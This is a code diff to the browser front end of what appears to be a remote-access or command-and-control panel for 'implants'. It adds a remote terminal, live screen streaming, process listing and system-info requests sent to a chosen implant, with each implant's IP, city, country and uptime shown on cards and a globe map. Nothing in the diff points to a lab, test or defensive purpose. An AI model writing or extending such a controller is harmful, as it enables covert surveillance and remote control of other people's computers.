@@ -478,10 +478,74 @@
             return Math.floor(s / 3600) + 'h ' + Math.floor((s % 3600) / 60) + 'm';
         }
 
-        // Live Dropdown Injector for Control Tab
+        function getActiveTarget() {
+            const el = document.querySelector('.dropdown-container[data-flag="ImplantTarget"] .dropdown-selected span');
+            return el ? el.textContent : "None";
+        }
+
+        function sendImplantCmd(cmd, args={}) {
+            const target = getActiveTarget();
+            if (target === "None") return;
+            const payload = { target: target, cmd: cmd, args: args };
+            document.title = "implant_cmd://" + JSON.stringify(payload);
+        }
+
+        function toggleStream() {
+            const btn = document.getElementById('btn-stream');
+            if(!btn) return;
+            if(btn.innerText === "Start Stream") {
+                btn.innerText = "Stop Stream";
+                sendImplantCmd('screen_start');
+            } else {
+                btn.innerText = "Start Stream";
+                sendImplantCmd('screen_stop');
+            }
+        }
+
+        function sendTerm() {
+            const inp = document.getElementById('term-in');
+            if(!inp) return;
+            const val = inp.value;
+            if(!val) return;
+            inp.value = '';
+            const out = document.getElementById('term-out');
+            if(out) out.value += "\n> " + val + "\n";
+            sendImplantCmd('term_cmd', { cmd: val });
+        }
+
+        function fetchProcesses() {
+            sendImplantCmd('ps_ls');
+        }
+
+        window.onImplantData = function(ip_port, data) {
+            if (ip_port !== getActiveTarget()) return;
+            
+            if (data.type === 'screen') {
+                const icon = document.getElementById('live-screen-icon');
+                const img = document.getElementById('live-screen-img');
+                if(icon) icon.style.display = 'none';
+                if(img) {
+                    img.style.display = 'block';
+                    img.src = "data:image/jpeg;base64," + data.data;
+                }
+            } else if (data.type === 'term_out') {
+                const out = document.getElementById('term-out');
+                if(out) {
+                    out.value += data.data + "\n";
+                    out.scrollTop = out.scrollHeight;
+                }
+            } else if (data.type === 'sys_info') {
+                const sysContent = document.getElementById('sys-info-content');
+                if(sysContent) sysContent.innerText = data.data;
+            } else if (data.type === 'ps_out') {
+                const psOut = document.getElementById('ps-out');
+                if(psOut) psOut.value = data.data;
+            }
+        };
+
         function updateDropdownDOM(flag, newOptions) {
             const container = document.querySelector(`.dropdown-container[data-flag="${flag}"]`);
-            if (!container) return; // Dropdown is not currently rendered
+            if (!container) return; 
 
             const optionsContainer = container.querySelector('.dropdown-options');
             const displaySpan = container.querySelector('.dropdown-selected span');
@@ -489,7 +553,6 @@
 
             let currentVal = displaySpan.textContent;
 
-            // Update Selected Val if needed
             if (!newOptions.includes(currentVal) && newOptions.length > 0) {
                 currentVal = newOptions[0];
                 displaySpan.textContent = currentVal;
@@ -499,7 +562,6 @@
                 displaySpan.textContent = currentVal;
             }
 
-            // Rebuild the HTML for the dropdown list dynamically
             const optionsHtml = newOptions.map(opt => {
                 const isSelected = opt === currentVal;
                 return `<div class="dropdown-option ${isSelected ? 'selected' : ''}" onclick="selectOption(this, '${opt}')">${opt}</div>`;
@@ -520,23 +582,19 @@
                 pill.className = 'status-pill'; stxt.textContent = 'Offline'; fStatus.textContent = 'Idle';
             }
 
-            // Keep the TAB_DATA up to date with the latest connection IPs
             const activeIds = implants.map(i => i.ip + ':' + i.port);
             const oldIds = TAB_DATA.control.grid[0].controls[0].options || [];
             
-            // Only update dropdown DOM if options list length/content changed
             if (activeIds.join(',') !== oldIds.join(',')) {
                 TAB_DATA.control.grid[0].controls[0].options = activeIds.length ? activeIds : ["None"];
-                if (currentTabIndex === 0) { // If Control Tab is Open
+                if (currentTabIndex === 0) { 
                     updateDropdownDOM('ImplantTarget', activeIds.length ? activeIds : ["None"]);
                 }
             }
 
-            // Correct Tab Indexes: 0 = Control, 1 = Implants, 2 = WorldView, 3 = Settings
             if (currentTabIndex === 1) renderImplants(implants);
             if (currentTabIndex === 2) {
                 renderGlobeMarkers(implants);
-                // Also update the active marker popup if someone is looking at it
                 const ov = document.getElementById('marker-overlay');
                 if (ov && ov.style.display === 'flex') {
                     const currentIp = document.getElementById('mo-ip').textContent;
@@ -544,7 +602,7 @@
                     if (imp) {
                         document.getElementById('mo-uptime').textContent = fmtUptime(imp.uptime);
                     } else {
-                        clearMarkerOverlay(); // Close if disconnected
+                        clearMarkerOverlay(); 
                     }
                 }
             }
@@ -578,18 +636,15 @@
 
             const ids = new Set(implants.map(i => i.ip + ':' + i.port));
             
-            // Remove disconnected implant cards smoothly
             list.querySelectorAll('.implant-card').forEach(c => { 
                 if (!ids.has(c.dataset.id)) c.remove(); 
             });
 
-            // Append new or just update existing without destroying hovering/clicking states
             implants.forEach(imp => {
                 const id = imp.ip + ':' + imp.port;
                 let card = list.querySelector(`.implant-card[data-id="${id}"]`);
                 
                 if (!card) {
-                    // Create New Card
                     const flag = countryFlag(imp.country_code);
                     const loc = [imp.city, imp.country].filter(Boolean).join(', ') || '—';
                     const coords = (imp.lat && imp.lon) ? imp.lat.toFixed(3) + ', ' + imp.lon.toFixed(3) : '—';
@@ -612,7 +667,6 @@
                         </div>`;
                     list.appendChild(card);
                 } else {
-                    // Update Time text natively on existing card
                     const uptimeEl = card.querySelector('.card-uptime');
                     if (uptimeEl) uptimeEl.textContent = fmtUptime(imp.uptime);
                 }
@@ -774,10 +828,30 @@
                     {header:'Config', span:'fill', controls:[
                         { ui:'dropdown',label:'Target Implant',type:'single',options: ["None"],flag:'ImplantTarget'},
                     ]},
-                    {header:'Live', span:'fill', controls:[
+                    {header:'System Details', span:'hhalf', controls:[
+                        { ui:'html', content: '<div id="sys-info-content" style="font-size:12px;color:var(--text-sub);white-space:pre-wrap;line-height:1.6;padding:0 8px;">Select an implant to view system details.</div>' }
                     ]},
-                    {header:'Control Panel', span:'fill', controls:[
+                    {header:'Process List', span:'hhalf', controls:[
+                        { ui:'html', content: `
+                            <div class="tool-btn" onclick="fetchProcesses()" style="width:120px; margin-bottom:10px;"><i class="fa-solid fa-arrows-rotate" style="margin-right:6px"></i> Refresh Ps</div>
+                            <textarea id="ps-out" readonly style="width:100%; height:200px; background:var(--input-bg); color:var(--text-sub); font-family:monospace; font-size:11px; padding:8px; border:1px solid var(--secondary); border-radius:4px; resize:vertical; outline:none; white-space:pre;"></textarea>
+                        `}
                     ]},
+                    {header:'Live Screen Feed', span:'fill', controls:[
+                        { ui:'html', content: `
+                            <div class="tool-btn" onclick="toggleStream()" id="btn-stream" style="width:120px; margin-bottom:10px;"><i class="fa-solid fa-play" style="margin-right:6px"></i> Start Stream</div>
+                            <div style="width:100%; aspect-ratio:16/9; background:#000; border-radius:8px; border:1px solid var(--secondary); display:flex; align-items:center; justify-content:center; overflow:hidden; position:relative; box-shadow: 0 4px 20px rgba(0,0,0,0.5);">
+                               <img id="live-screen-img" style="width:100%; height:100%; object-fit:contain; display:none;" />
+                               <i id="live-screen-icon" class="fa-solid fa-desktop" style="font-size:48px; color:var(--text-sub); opacity:0.3;"></i>
+                            </div>
+                        `}
+                    ]},
+                    {header:'Live Terminal', span:'fill', controls:[
+                        { ui:'html', content: `
+                            <textarea id="term-out" readonly style="width:100%; height:250px; background:var(--input-bg); color:var(--accent); font-family:monospace; font-size:11px; padding:12px; border:1px solid var(--secondary); border-radius:4px; margin-bottom:8px; resize:vertical; outline:none;"></textarea>
+                            <input id="term-in" type="text" placeholder="Enter remote command..." onkeydown="if(event.key==='Enter') sendTerm()" style="width:100%; background:var(--input-bg); color:var(--text-color); font-family:monospace; font-size:11px; padding:10px 12px; border:1px solid var(--secondary); border-radius:4px; outline:none;" />
+                        `}
+                    ]}
                 ]
             },
             settings: {
@@ -886,7 +960,35 @@
         function handleToggleClick(el, flag) { el.classList.toggle('on'); updateBackend(flag, el.classList.contains('on')); }
         function updateSliderTooltip(input, flag) { const val = parseFloat(input.value); const min = parseFloat(input.min); const max = parseFloat(input.max); const percent = (val - min) / (max - min) * 100; const tooltip = input.parentElement.querySelector('.slider-tooltip'); if (tooltip) { tooltip.textContent = val; const correction = 8 - (percent * 0.16); tooltip.style.left = `calc(${percent}% + ${correction}px)`; } updateBackend(flag, val); }
         function toggleDropdown(el) { const container = el.parentElement; const isOpen = container.classList.contains('open'); closeAllPopovers(); if(!isOpen) { container.classList.add('open'); el.classList.add('active'); } }
-        function selectOption(el, value) { const container = el.closest('.dropdown-container'); const display = container.querySelector('.dropdown-selected span'); const flag = container.dataset.flag; display.textContent = value; container.querySelectorAll('.dropdown-option').forEach(opt => opt.classList.remove('selected')); el.classList.add('selected'); updateBackend(flag, value); closeAllPopovers(); }
+        
+        function selectOption(el, value) { 
+            const container = el.closest('.dropdown-container'); 
+            const display = container.querySelector('.dropdown-selected span'); 
+            const flag = container.dataset.flag; 
+            display.textContent = value; 
+            container.querySelectorAll('.dropdown-option').forEach(opt => opt.classList.remove('selected')); 
+            el.classList.add('selected'); 
+            updateBackend(flag, value); 
+            closeAllPopovers(); 
+
+            if(flag === 'ImplantTarget') {
+                setTimeout(() => {
+                    sendImplantCmd('sys_info');
+                    sendImplantCmd('screen_stop');
+                    const btnStream = document.getElementById('btn-stream');
+                    if (btnStream) btnStream.innerHTML = '<i class="fa-solid fa-play" style="margin-right:6px"></i> Start Stream';
+                    const lsImg = document.getElementById('live-screen-img');
+                    if (lsImg) lsImg.style.display = 'none';
+                    const lsIco = document.getElementById('live-screen-icon');
+                    if (lsIco) lsIco.style.display = 'block';
+                    const tOut = document.getElementById('term-out');
+                    if (tOut) tOut.value = '';
+                    const pOut = document.getElementById('ps-out');
+                    if (pOut) pOut.value = '';
+                }, 100);
+            }
+        }
+        
         function closeAllPopovers() { document.querySelectorAll('.dropdown-container.open, .color-container.open').forEach(d => { d.classList.remove('open'); const trigger = d.querySelector('.dropdown-selected, .color-trigger'); if(trigger) trigger.classList.remove('active'); }); }
         window.addEventListener('click', function(e) { if (!e.target.closest('.dropdown-container') && !e.target.closest('.color-container') && !isDraggingColor && !isDraggingHue) closeAllPopovers(); });
 
@@ -894,6 +996,8 @@
             if (!ctrl || !ctrl.ui) return '';
             const ui = String(ctrl.ui).toLowerCase();
             if (ui === 'divider') return `<div class="divider"></div>`;
+            if (ui === 'html') return `<div style="padding:4px 0;">${ctrl.content}</div>`;
+
             const labelText = ctrl.label ?? '';
             let html = `<div class="control-item"><label>${labelText}</label>`;
 
@@ -963,7 +1067,6 @@
                         
                         injector.innerHTML = buildPanel(key);
                         
-                        // Populate correct data based on the open tab
                         if (key === 'control') updateDropdownDOM('ImplantTarget', TAB_DATA.control.grid[0].controls[0].options);
                         if (key === 'implants') renderImplants(_implants);
                         
